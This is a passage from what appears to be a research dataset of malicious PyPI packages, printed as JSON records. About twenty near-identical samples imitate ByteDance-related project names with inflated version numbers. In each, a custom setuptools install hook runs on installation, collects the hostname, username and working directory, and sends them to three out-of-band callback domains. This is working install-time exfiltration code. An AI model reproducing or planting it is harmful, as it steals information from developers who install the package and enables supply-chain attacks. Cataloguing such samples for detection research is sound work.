        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytedsp\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytedsp\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-byteff-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"byteff\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byteff\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-fadlearner-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"fadlearner\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fadlearner\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-fedlearnerr-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"fedlearnerr\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fedlearnerr\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-fedlearnre-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"fedlearnre\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fedlearnre\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-imagedream-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"ImageDream\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ImageDream\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-asmutation-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"ASMutation\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ASMutation\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytedplus-rec-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytedplus-rec\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytedplus-rec\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytedplus-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytedplus\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytedplus\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytedps-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"Bytedps\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Bytedps\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-monlith-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"monlith\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"monlith\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-monoliht-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"monoliht\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"monoliht\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-monolit-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"monolit\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"monolit\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-music-source-separation-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"music_source_separation\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"music_source_separation\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-mvdream-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"MVDream\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"MVDream\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-next-vit-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"Next-ViT\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Next-ViT\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-piano-transcription-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"piano_transcription\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"piano_transcription\",\n    version=\"912.6\",\n    author=\"214\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-res-adapter-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"res-adapter\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"res-adapter\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-uus-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"uus\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"uus\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-uuss-v912.6",
